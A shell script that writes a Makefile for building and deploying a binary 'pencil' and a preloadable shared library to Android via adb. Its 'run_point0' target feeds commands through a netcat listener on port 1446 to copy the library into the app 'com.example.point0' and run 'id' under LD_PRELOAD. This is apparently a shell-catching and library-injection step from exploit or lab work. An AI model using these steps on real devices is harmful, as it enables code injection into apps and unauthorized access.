if [ -n "$1" ];
then
    C=`locate toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android$1-clang | head -1`
    CXX=`locate toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android$1-clang | tail -1`
    echo "Configuring for arm64"
    echo "C compiler : $C"
    echo "C++ compiler : $CXX"
else
	C=clang
	CXX=clang++
fi



mkdir -p ../build
echo "BINARY=pencil" > ../build/Makefile
echo "LIBNAME=lib\${BINARY}.so" >> ../build/Makefile
echo "all: compile" >> ../build/Makefile
echo "	@echo Done." >> ../build/Makefile
echo "" >> ../build/Makefile
echo "run_point0: compile push_adb" >> ../build/Makefile
echo "	echo \"cp /data/local/tmp/\${LIBNAME} /data/data/com.example.point0/files/; LD_PRELOAD=/data/data/com.example.point0/files/\${LIBNAME} id; sleep 1; exit\" | nc -lvnp 1446" >> ../build/Makefile
echo "" >> ../build/Makefile
echo "run_adb: compile push_adb" >> ../build/Makefile
echo "	@adb shell /data/local/tmp/\${BINARY}" >> ../build/Makefile
echo "" >> ../build/Makefile
echo "run: compile" >> ../build/Makefile
echo "	@./\${BINARY}" >> ../build/Makefile
echo "" >> ../build/Makefile
echo "push_adb: compile" >> ../build/Makefile
echo "	@adb push \${BINARY} /data/local/tmp" >> ../build/Makefile
echo "	@adb push \${LIBNAME} /data/local/tmp" >> ../build/Makefile
echo "" >> ../build/Makefile
echo "push_ssh: compile" >> ../build/Makefile
echo "	@scp ./\${BINARY} root@localhost:/root/" >> ../build/Makefile
echo "	@scp ./\${LIBNAME} root@localhost:/root/" >> ../build/Makefile
echo "" >> ../build/Makefile
echo "" >> ../build/Makefile
echo "compile:" >> ../build/Makefile
echo "	@${C} `pwd`/*.c -static -o \${BINARY}" >> ../build/Makefile
echo "	@${C} `pwd`/*.c -DSHARED_LIBRARY -shared -fPIC -o \${LIBNAME}" >> ../build/Makefile


